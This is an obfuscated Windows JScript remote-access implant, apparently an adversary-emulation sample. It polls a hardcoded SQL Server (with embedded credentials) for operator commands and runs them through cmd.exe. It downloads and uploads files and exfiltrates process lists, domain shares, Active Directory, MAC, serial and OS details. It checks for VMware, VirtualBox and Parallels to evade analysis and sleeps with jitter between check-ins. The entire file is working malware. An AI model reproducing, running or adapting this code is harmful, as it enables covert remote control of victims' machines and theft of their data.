var _0x2d07=['fields','ExecQuery','Type','Select\x20*\x20from\x20Win32_LogicalDisk','value','Scripting.FileSystemObject','append','moveNext','EOF','SMBIOSBIOSVersion','mBinary','Sleep','ADODB.Stream','CommandText','Run','error0***code_error','Command','filecontent','hostname***','Close','vmware','part_of_domain***no','Execute','replace','Position','ExpandEnvironmentStrings','substr','Open','\x202>&1','ADODB.Command','parallels','adinformation***','echo\x20Command\x20executed.\x20>\x20','update','CreateObject','open','loadFromFile','Provider=SQLOLEDB;Server=192.168.0.6;Database=tempdb;UID=evals_user;PWD=Password1234;','get-mac-serial','enum-system','ComputerName','ADSystemInfo','toLowerCase','Write','length','Name','Version','part_of_domain***yes','Domain','is_vm:\x20','item','winmgmts:','powershell.exe','read','MACAddress','SerialNumber','%comspec%\x20/C\x20echo\x20\x27[+]\x20Upload\x20Complete\x27\x20>\x20','INSERT\x20INTO\x20Responses\x20(filecontent,\x20request_id)\x20VALUES\x20(?,\x20','addNew','random','GetTempName','ActiveConnection','select\x20*\x20from\x20Win32_Process','VolumeSerialNumber','StdOut','ADODB.Connection','string','size','atEnd','cmd.exe\x20/c\x20net\x20view\x20/domain\x20hospitality.local\x202>&1','WriteLine','OSArchitecture','SELECT\x20ID,\x20cmd,\x20filecontent\x20FROM\x20Requests;','virtualbox','Select\x20*\x20From\x20Win32_ComputerSystem','CreateParameter','ADODB.Recordset','FileContent','upload','push','%USERNAME%','\x20>\x20','username***','%comspec%\x20/C\x20','INSERT\x20INTO\x20Responses\x20(response,\x20request_id)\x20VALUES\x20(?,\x20','Model','Select\x20*\x20From\x20Win32_BIOS','Append','adinformation***no_ad','pc_domain***','exec','indexOf','PartOfDomain','getFile','Select\x20*\x20From\x20Win32_OperatingSystem','ReadAll','cmd','DeleteFile','OpenTextFile','split','DNSHostName','round','WScript.Shell'];(function(_0x59e928,_0x2d0729){var _0x59694e=function(_0x2608a1){while(--_0x2608a1){_0x59e928['push'](_0x59e928['shift']());}};_0x59694e(++_0x2d0729);}(_0x2d07,0x1de));var _0x5969=function(_0x59e928,_0x2d0729){_0x59e928=_0x59e928-0x0;var _0x59694e=_0x2d07[_0x59e928];return _0x59694e;};function listRunningProcesses(){var _0x21cd5b='';var _0x409ce7=GetObject(_0x5969('0x58'));var _0x36ba45=_0x409ce7[_0x5969('0x26')](_0x5969('0x63'));var _0xcc5ea0=new Enumerator(_0x36ba45);for(;!_0xcc5ea0[_0x5969('0x2')]();_0xcc5ea0[_0x5969('0x2c')]()){var _0x50f9db=_0xcc5ea0[_0x5969('0x57')]();_0x21cd5b+='\x0a'+_0x50f9db[_0x5969('0x52')];}return _0x21cd5b;}function netShareDiscovery(){var _0xe1732a=WScript[_0x5969('0x47')]('WScript.Shell');try{var _0x308096=_0xe1732a[_0x5969('0x18')](_0x5969('0x3'));var _0x18de4e=_0x308096[_0x5969('0x65')][_0x5969('0x1d')]();}catch(_0x5f0e18){var _0x18de4e='Error:\x20'+_0x5f0e18;}return _0x18de4e;}function isVm(){var _0x4f8efd=GetObject(_0x5969('0x58'));var _0x1f2fb4=_0x4f8efd[_0x5969('0x26')](_0x5969('0x14'));var _0x548286=new Enumerator(_0x1f2fb4);for(;!_0x548286[_0x5969('0x2')]();_0x548286[_0x5969('0x2c')]()){var _0x3ee708=_0x548286[_0x5969('0x57')]()[_0x5969('0x2e')][_0x5969('0x4f')]();var _0x5714cb=_0x548286['item']()[_0x5969('0x5c')][_0x5969('0x4f')]();if(_0x5714cb[_0x5969('0x19')](_0x5969('0x43'))>=0x0||_0x5714cb[_0x5969('0x19')](_0x5969('0x39'))>=0x0){return!![];}if(_0x3ee708[_0x5969('0x19')](_0x5969('0x39'))>=0x0||_0x3ee708[_0x5969('0x19')](_0x5969('0x7'))>=0x0){return!![];}}return![];}function getADInformation(){try{var _0x9132b6=new ActiveXObject(_0x5969('0x4e'));return _0x9132b6[_0x5969('0x4d')];}catch(_0x2f0f2a){return![];}}function getEnvVar(_0x2d0c11){var _0x1b9046=WScript[_0x5969('0x47')](_0x5969('0x24'));return _0x1b9046[_0x5969('0x3e')](_0x2d0c11);}function getSysInfo(){var _0x52077b=[];var _0x1fb0b8=GetObject(_0x5969('0x58'));try{_0x52077b[_0x5969('0xd')](_0x5969('0x10')+getEnvVar(_0x5969('0xe')));_0x52077b[_0x5969('0xd')](_0x5969('0x37')+getEnvVar('%COMPUTERNAME%'));var _0x24b9b2=getADInformation();if(_0x24b9b2){_0x52077b['push'](_0x5969('0x44')+_0x24b9b2);}else{_0x52077b[_0x5969('0xd')](_0x5969('0x16'));}var _0x4b1fba=_0x1fb0b8[_0x5969('0x26')](_0x5969('0x8'));var _0x25059a=new Enumerator(_0x4b1fba);for(;!_0x25059a[_0x5969('0x2')]();_0x25059a['moveNext']()){if(_0x25059a[_0x5969('0x57')]()[_0x5969('0x1a')]){_0x52077b['push'](_0x5969('0x54'));}else{_0x52077b[_0x5969('0xd')](_0x5969('0x3a'));}_0x52077b[_0x5969('0xd')](_0x5969('0x17')+_0x25059a[_0x5969('0x57')]()[_0x5969('0x55')]);_0x52077b[_0x5969('0xd')]('pc_dns_host_name***'+_0x25059a[_0x5969('0x57')]()[_0x5969('0x22')]);_0x52077b['push']('pc_model***'+_0x25059a[_0x5969('0x57')]()[_0x5969('0x13')]);}}catch(_0x459182){_0x52077b[_0x5969('0xd')](_0x5969('0x34'));}try{var _0x4150a2=_0x1fb0b8[_0x5969('0x26')](_0x5969('0x1c'));var _0x5bc8d9=new Enumerator(_0x4150a2);for(;!_0x5bc8d9[_0x5969('0x2')]();_0x5bc8d9[_0x5969('0x2c')]()){if(_0x5bc8d9[_0x5969('0x57')]()[_0x5969('0x5')]){_0x52077b[_0x5969('0xd')]('os_architecture***'+_0x5bc8d9[_0x5969('0x57')]()[_0x5969('0x5')]);}if(_0x5bc8d9['item']()[_0x5969('0x53')]){_0x52077b[_0x5969('0xd')]('os_version***'+_0x5bc8d9['item']()[_0x5969('0x53')]);}}}catch(_0x1d4c65){_0x52077b[_0x5969('0xd')]('error1***code_error');}return _0x52077b;}function getSysInfoDiscovery(){output=_0x5969('0x56')+isVm()+'\x0a';output+=getSysInfo();return output;}function getMacSerial(){var _0x238b8a=GetObject(_0x5969('0x58'));var _0x314b51=_0x238b8a[_0x5969('0x26')]('Select\x20*\x20From\x20Win32_NetworkAdapterConfiguration\x20Where\x20IPEnabled\x20=\x20True');var _0x59633a='',_0x30ac8b='';for(var _0x35e2e8=new Enumerator(_0x314b51);!_0x35e2e8[_0x5969('0x2')]();_0x35e2e8[_0x5969('0x2c')]()){var _0x12a8e8=_0x35e2e8[_0x5969('0x57')]();if(typeof _0x12a8e8[_0x5969('0x5b')]==_0x5969('0x0')){_0x59633a=_0x12a8e8[_0x5969('0x5b')][_0x5969('0x3c')](/:/g,'');break;}}var _0x39221c=_0x238b8a[_0x5969('0x26')](_0x5969('0x28'));for(var _0x35e2e8=new Enumerator(_0x39221c);!_0x35e2e8[_0x5969('0x2')]();_0x35e2e8[_0x5969('0x2c')]()){var _0x12a8e8=_0x35e2e8[_0x5969('0x57')]();if(typeof _0x12a8e8[_0x5969('0x64')]==_0x5969('0x0')){_0x30ac8b=_0x12a8e8[_0x5969('0x64')];break;}}var _0x38ed0d=_0x59633a+_0x30ac8b;_0x38ed0d=_0x38ed0d[_0x5969('0x3f')](0x0,0x15);return _0x38ed0d;}function sleep(){min=0x1;max=0x3;jitter=Math[_0x5969('0x23')](Math[_0x5969('0x60')]()*(max-min)+min);sleepInterval=0x1f4*0x3*jitter;WScript[_0x5969('0x30')](sleepInterval);}function getRandomFile(){var _0x4d39dd=new ActiveXObject(_0x5969('0x2a'));randomFile=_0x4d39dd['GetSpecialFolder'](0x2)+'\x5c'+_0x4d39dd[_0x5969('0x61')]();return randomFile;}function getCommandOutput(_0x1bba47){var _0xe169cb=new ActiveXObject(_0x5969('0x2a'));fileOutput=_0xe169cb[_0x5969('0x20')](_0x1bba47);cmdOutput=fileOutput[_0x5969('0x1d')]();fileOutput[_0x5969('0x38')]();_0xe169cb[_0x5969('0x1f')](_0x1bba47);return cmdOutput;}function sendTaskOutput(_0x47a6fa,_0x4487e4,_0x1e5f9b){var _0x44b92e=new ActiveXObject('ADODB.Command');_0x44b92e[_0x5969('0x32')]=_0x5969('0x12')+_0x1e5f9b+')';_0x44b92e['Parameters'][_0x5969('0x15')](_0x44b92e[_0x5969('0x9')](_0x5969('0x35'),0x81,0x1,_0x4487e4[_0x5969('0x51')]+0x1,_0x4487e4));_0x44b92e[_0x5969('0x62')]=_0x47a6fa;_0x44b92e[_0x5969('0x3b')]();}function downloadFile(_0x1f2920,_0x2063ae){var _0x28ddfd=WScript['CreateObject'](_0x5969('0x31'));_0x28ddfd['Open']();_0x28ddfd['Type']=0x1;_0x28ddfd[_0x5969('0x50')](_0x2063ae);_0x28ddfd[_0x5969('0x3d')]=0x0;var _0x5d2651=WScript[_0x5969('0x47')](_0x5969('0x2a'));if(_0x5d2651['FileExists'](_0x1f2920)){_0x5d2651[_0x5969('0x1f')](_0x1f2920);}_0x28ddfd['SaveToFile'](_0x1f2920,0x2);_0x28ddfd[_0x5969('0x38')]();}function uploadFile(_0x544f03,_0x17a437,_0x589ca4){var _0x4677a6=new ActiveXObject(_0x5969('0x31'));var _0x3edca9=new ActiveXObject(_0x5969('0x2a'));var _0x3c6872=_0x3edca9[_0x5969('0x1b')](_0x17a437)[_0x5969('0x1')];_0x4677a6[_0x5969('0x27')]=0x1;_0x4677a6[_0x5969('0x40')];_0x4677a6[_0x5969('0x49')](_0x17a437);var _0x193a1c=_0x4677a6[_0x5969('0x5a')]();var _0x914931=0xcc;var _0x4db223=new ActiveXObject('ADODB.Recordset');_0x4db223[_0x5969('0x25')][_0x5969('0x2b')]('mBinary',_0x914931,_0x3c6872);_0x4db223[_0x5969('0x48')]();_0x4db223[_0x5969('0x5f')]();_0x4db223(_0x5969('0x2f'))[_0x5969('0x29')]=_0x193a1c;_0x4db223[_0x5969('0x46')]();var _0x467b85=new ActiveXObject(_0x5969('0x42'));_0x467b85[_0x5969('0x32')]=_0x5969('0x5e')+_0x589ca4+')';_0x467b85['Parameters']['Append'](_0x467b85[_0x5969('0x9')](_0x5969('0xb'),0x80,0x1,_0x3c6872+0x1,_0x4db223(_0x5969('0x2f'))[_0x5969('0x29')]));_0x467b85[_0x5969('0x62')]=_0x544f03;_0x467b85['Execute']();}function execShellCommand(_0x22f9ad,_0x232aee,_0x4cf1ee,_0x1ebec4,_0x32d0b1){hasOutput=!![];noOutput=![];if(_0x22f9ad[_0x5969('0x51')]==0x0){return noOutput;}var _0x341fa9=new ActiveXObject(_0x5969('0x24'));s=_0x22f9ad[_0x5969('0x21')]('\x20');if(s[0x0]=='download'){downloadFile(s[0x1],_0x4cf1ee);cmdWithRedirect=_0x5969('0x5d')+_0x232aee+_0x5969('0x41');_0x341fa9[_0x5969('0x33')](cmdWithRedirect,0x0,!![]);return hasOutput;}else if(s[0x0]==_0x5969('0xc')){uploadFile(_0x1ebec4,s[0x1],_0x32d0b1);return noOutput;}else if(s[0x0]==_0x5969('0x4c')){sysinfo=listRunningProcesses();sysinfo+='\x0a\x0a';sysinfo+=netShareDiscovery();sysinfo+='\x0a\x0a';sysinfo+=getSysInfoDiscovery();var _0x2e2269=new ActiveXObject(_0x5969('0x2a'));fileHandle=_0x2e2269['OpenTextFile'](_0x232aee,0x2,!![]);fileHandle[_0x5969('0x4')](sysinfo);fileHandle[_0x5969('0x38')]();return hasOutput;}else if(s[0x0]==_0x5969('0x4b')){sysinfo=getMacSerial();var _0x2e2269=new ActiveXObject('Scripting.FileSystemObject');fileHandle=_0x2e2269[_0x5969('0x20')](_0x232aee,0x2,!![]);fileHandle[_0x5969('0x4')](sysinfo);fileHandle[_0x5969('0x38')]();return hasOutput;}else{cmdNoRedirect=_0x5969('0x11')+_0x22f9ad+_0x5969('0xf')+_0x232aee+_0x5969('0x41');cmdCreateFile='%comspec%\x20/C\x20'+_0x5969('0x45')+_0x232aee+_0x5969('0x41');cmdWithRedirect=_0x5969('0x11')+_0x22f9ad+_0x5969('0xf')+_0x232aee+'\x202>&1';if(s[0x0]==_0x5969('0x59')){_0x341fa9[_0x5969('0x33')](cmdCreateFile,0x0,!![]);_0x341fa9[_0x5969('0x33')](cmdWithRedirect,0x0,![]);}else{_0x341fa9[_0x5969('0x33')](cmdWithRedirect,0x0,!![]);}return hasOutput;}}function deleteCmd(_0x3d7baa,_0x5ebc1b){cmd='DELETE\x20FROM\x20Requests\x20WHERE\x20ID\x20=\x20'+_0x3d7baa;_0x5ebc1b[_0x5969('0x3b')](cmd);}function getTasking(_0x5aa65c,_0x421c28){cmd=_0x5969('0x6');_0x421c28=_0x5aa65c[_0x5969('0x3b')](cmd);while(!_0x421c28[_0x5969('0x2d')]){cmdStr=''+_0x421c28(_0x5969('0x1e'));idStr=''+_0x421c28('id');fileBlob=_0x421c28(_0x5969('0x36'));var _0x4e1404=getRandomFile();cmdOutput='';try{hasOutput=execShellCommand(cmdStr,_0x4e1404,fileBlob,_0x5aa65c,idStr);if(hasOutput==!![]){cmdOutput=getCommandOutput(_0x4e1404);sendTaskOutput(_0x5aa65c,cmdOutput,idStr);}}catch(_0x3c2fda){deleteCmd(idStr,_0x5aa65c);_0x421c28['MoveNext'];continue;}deleteCmd(idStr,_0x5aa65c);_0x421c28['MoveNext'];}}function main(){var _0x33cc7a=new ActiveXObject(_0x5969('0x66'));var _0x27dcf8=new ActiveXObject(_0x5969('0xa'));var _0x25b760=_0x5969('0x4a');try{_0x33cc7a[_0x5969('0x40')](_0x25b760);}catch(_0x5e8496){finet=0x0;}while(!![]){sleep();try{command=getTasking(_0x33cc7a,_0x27dcf8);}catch(_0xee7673){continue;}}}main();